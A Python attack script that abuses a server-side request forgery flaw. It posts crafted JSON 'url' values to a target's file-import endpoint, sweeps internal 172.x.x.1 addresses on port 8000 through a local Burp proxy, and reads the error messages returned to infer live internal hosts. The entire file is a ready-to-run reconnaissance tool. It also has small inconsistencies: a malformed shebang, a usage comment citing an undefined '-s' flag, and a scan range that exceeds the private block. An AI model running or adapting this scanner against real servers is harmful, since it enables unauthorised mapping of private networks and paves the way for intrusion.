#/usr/bin/env python3

import argparse
import requests

parser = argparse.ArgumentParser()
parser.add_argument('-t','--target',help='host/ip to target', required=True)
parser.add_argument('--timeout',help='timeout',required=False,default=3)

parser.add_argument('-v','--verbose',help='enable verbose mode',action="store_true",default=False)
#/bin/python3 /home/kali/Desktop/ssrf_port_scanner.py -t http://xxxx:8000/files/import -s http://localhost --timeout 5
args = parser.parse_args()

base_ip = "http://172.{two}.{three}.1"
baseurl =args.target
timeout = float(args.timeout)

proxy = {
    'http': 'http://127.0.0.1:8080',  # Replace with your Burp Suite proxy address
    'https': 'http://127.0.0.1:8080'  # Replace with your Burp Suite proxy address
}


for y in range(16,256):
    for x in range(1,256):
        host = base_ip.format(two=int(y),three=int(x))
        p = 8000
        print("Trying host: {host}".format(host=host))
        try:
            r = requests.post(url=args.target, proxies=proxy, json={"url":"{host}:{port}".format(host=host,port=int(p))},timeout=timeout)
            if args.verbose:
                print("\t{port:0} \t {msg}".format(port=int(p),msg=r.text))
            if "Request failed with status code 404" in r.text:
                print("{port:0} \t OPEN - returned 404, therefore valid resource".format(port=int(p)))
            elif "You don't have permision to access this." in r.text:
                print("{port:0} \t OPEN - returned permission error, threfore valid resource".format(port=int(p),msg=r.text))
            elif "Parse Error:" in r.text:
                print("{port:0} \t ??? returned parse error, potentially non-http".format(port=int(p)))
            elif "socket hang up" in r.text:
                print("{port:0} \t returned socket hang up, likely non-http".format(port=int(p)))
            elif "??" in r.text:
                print("{port:0} \t socket hang up, likely non-http".format(port=int(p)))
        except requests.exceptions.Timeout:
            print("\t{port:0} \t timed out".format(port=int(p)))


